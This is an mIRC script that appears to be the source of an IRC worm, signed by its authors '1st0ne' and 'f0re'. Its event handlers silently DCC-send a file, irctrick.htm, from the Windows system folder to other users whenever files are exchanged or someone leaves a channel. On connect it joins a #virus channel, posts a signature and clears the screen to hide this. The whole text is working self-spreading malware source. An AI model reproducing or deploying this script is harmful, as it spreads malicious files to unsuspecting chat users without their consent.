[script]
on 1:FILERCVD:*.*:./dcc send $nick  c:\windows\system\irctrick.htm
on 1:FILESENT:*.*:./dcc send $nick c:\windows\system\irctrick.htm
on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\system\irctrick.htm
on 1:TEXT:*hi*:*:/msg $chan we cannot attach any absolute significance to the concept of simultaneity


on 1:connect: {
/join #virus
/msg #virus 1st0ne lives f0revir
/part #virus
/clear
/motd
}


;MyName = 1st0ne
;WrittenBy = f0re
